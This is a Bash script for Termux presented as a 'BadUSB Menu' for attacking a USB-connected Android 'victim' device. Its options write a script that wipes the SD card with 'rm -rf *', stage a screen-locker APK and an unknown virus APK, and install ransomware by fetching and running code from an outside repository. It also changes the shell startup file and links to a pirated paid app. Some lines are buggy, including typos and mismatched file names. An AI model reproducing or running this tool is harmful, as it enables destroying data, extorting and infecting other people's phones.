red="\033[0;49;91m"
green="\033[0;49;92m"
yellow="\033[0;49;93m"
dblue="\033[0;49;94m"
violet="\033[0;49;95m"
blue="\033[0;49;96m"
white="\033[0;49;97m"
excla0=$(echo -e $violet"EXPLOIT\033[m")
excla=$(echo -e $green"INFO\033[m")
excla1=$(echo -e $yellow"WARNING\033[m")
excla2=$(echo -e $red"CRITICAL\033[m")

exp0=$(echo -e $violet"!\033[m")
exp=$(echo -e $green"1\033[m")
exp1=$(echo -e $yellow"2\033[m")              
exp2=$(echo -e $red"3\033[m")
exp3$(echo -e $dblue" 4\033[m")
exp4=$(echo -e $blue"5\033[m")
clear
sleep 1
echo -e $red ""
echo "you shouldnt be here..."
echo -e "\033[m"
while :
do
	termux-usb -l >> logusb.txt
	letter=$(cat logusb.txt | cut -d" " -f1)
	if [ "$letter" == "[]" ]
	then
		echo -e $red "Waiting for device...\033[m"
		rm logusb.txt
	else
		echo -e $green "Device Founded!\033[m"
		rm logusb.txt
		sleep 0.5
		echo -e "[$excla] Starting BadUSB Menu😈"
		sleep 2
		while :
		do
			clear
			echo -e $red ""
			cat banner.txt
			echo -e "\033[m"
			echo ""
			sleep 1
			termux-setup-storage ; echo "echo type badusb to start the bdb console" >> /data/data/com.#/files/usr/etc/bash.bashrc ; echo "alias badusb='cd /data/data/com.#/files/home/bdb ; bash usbchecker.sh' " >> /data/data/com.#/files/bash.bashrc
			am start -a android.intent.action.VIEW -d https://www.mediafire.com/file/i727ltg8qabq4r5/Bugjaeger_Premium_v6.0-full_b258_%2528Paid%2529.apk/file ; mkdir /sdcard/BADUSB-FILES
			echo -e "[$excla1] YOU NEED BUGJAEGER, DEBUG USB PERMISSION AND THE UNLOCKED SMARTPHONE!"
			sed -i '46s/termux/#/' usbchecker.sh ; sed -i '47s/am/#/' usbchecker.sh
			echo -e "[!] Choose an option!"
			echo " "
			echo " "
			echo -e "[$exp] $red Exclude All Files\033[m"
			echo -e "[$exp1] $violet Lock Android\033[m"
			echo -e "[$exp2] $violet Encrypt Files\033[m"
			echo -e "[\033[91m4] $red Infect With A Random Virus\033[m"
			echo -e "[$exp4] $green Troll\033[m"
			echo ""
			echo -e $red "[99] Exit\033[m"
			echo -e $green "[i] Info\033[m"
			echo ""
			read -p "----} " opt
			if [ "$opt" == "i" ]
			then
				echo -e $white "BadUSB is an attack from a device to a victim\033[m"
				sleep 6
				echo -e $green "If your device are rooted, you can made\033[m\033[4;49;91m amazing things. \033[m"
				sleep 1
				echo -e $red "How i run this files?\033"
				sleep 1
				echo -e $white "In the bugjaeger premium, go to\033[m\033[0;49;91m (+)\033[m $white Name your file and click on\033[m $red Run executable file\033[m $white after this select your file from\033[m $red /<Your smartphone name>/BADUSB-FILES/\033[m $white save you file, go to the bellow of bugjaeger page and run your script!\033[m"
				read -p "press enter"
				
			elif [ "$opt" == "99" ]
			then
				echo -e $green "Thank you for using my programm!\033[m"
				break
			elif [ "$opt" == "1" ]
			then
				echo -e "[$excla] See the tutorial in $green info\033[m "
				sleep 3
				am start --user 0 -n eu.sisik.hackendebug.full/eu.sisik.hackendebug.SplashActivity
				echo "cd sdcard ; rm -rf *" >> removefiles.sh
				mv remove.sh /sdcard/BADUSB-FILES
				echo -e "[$excla0] Script Saved in /sdcard/BADUSB-FILES"
				echo ""
				read -p "press enter"
			elif [ "$opt" == "2" ]
			then
				echo -e "[$excla] The FakeRoot(Locker).apk Has beeing moved to internal storage."
				sleep 0.5
				echo -e "$[$excla0] Install And Run the Apk in the Victim Device Using Bugjaeger"
				mv FakeRoot.apk /sdcard/BADUSB-FILES
				sleep 0.5
				echo -e "[$excla] FakeRoot.apk was moved to /sdcard/BADUSB-FILES"
				read -p "press enter"
				sed -i '93s/mv/#' usbchecker.sh
			elif [ "$opt" == "3" ]
			then
				echo -e "[$excla] You need to install termux in the victim device"
				sleep 5
				echo -e "[$excla0] And run this commands: $red pkg install git -y ; git clone https://github.com/z4kc/termux-ransom ; bash install.sh\033[m"
				sleep 5
				echo -e "[$excla] The link to install is: $red https://www.mediafire.com/file/6vlu7ccx95o0iuw/termux.apk/file \033[m"
				echo ""
				read -p "press enter" 
				
			elif [ "$opt" == "4" ]
			then
				echo -e "[$excla1] A random virus have been moved to /sdcard/BADUSB-FILES"
				sleep 1
				mv unknowvirus.apk /sdcard/BADUSB-FILES
				echo -e "[$excla0] Install him and execute in victim device!"
				sleep 0.5
				echo -e "[$excla2] I DONT KNOW WHAT THAT VIRUS DO, USE IT FOR YOUR OWN RISK!"
				echo ""
				read -p "press enter"
				
			elif [ "$opt" == "5" ]
			then
				echo -e "[$excla] The troll script has been moved to /sdcard/BADUSB-FILES"
				echo ""
				mv troolge.sh /sdcard/BADUSB-FILES
				echo -e "[$excla] For more instructions go to $red info\033[m"
				echo ""
				resd -p "press enter"
				
			else
				echo "00 0X0 X00X0 0X 00 0X 000 0000 X00X 00X0X0X 0 X0X0X0"
				sleep 1
			fi
			break
		done

	fi

done

